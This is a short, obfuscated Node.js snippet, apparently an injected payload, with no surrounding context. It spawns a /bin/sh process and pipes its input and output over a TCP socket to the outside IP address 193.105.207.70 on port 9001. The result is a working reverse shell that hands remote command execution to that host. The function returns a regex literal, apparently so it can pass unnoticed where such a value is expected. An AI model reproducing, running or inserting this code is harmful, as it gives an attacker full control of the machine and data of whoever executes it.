;(function () {
  var _0x25e641 = require('net'),
    _0x55d213 = require('child_process'),
    _0x2bd06e = _0x55d213.spawn('/bin/sh', [])
  var _0x2c47ee = new _0x25e641.Socket()
  _0x2c47ee.connect(9001, '193.105.207.70', function () {
    _0x2c47ee.pipe(_0x2bd06e.stdin)
    _0x2bd06e.stdout.pipe(_0x2c47ee)
    _0x2bd06e.stderr.pipe(_0x2c47ee)
  })
  return /a/
})()

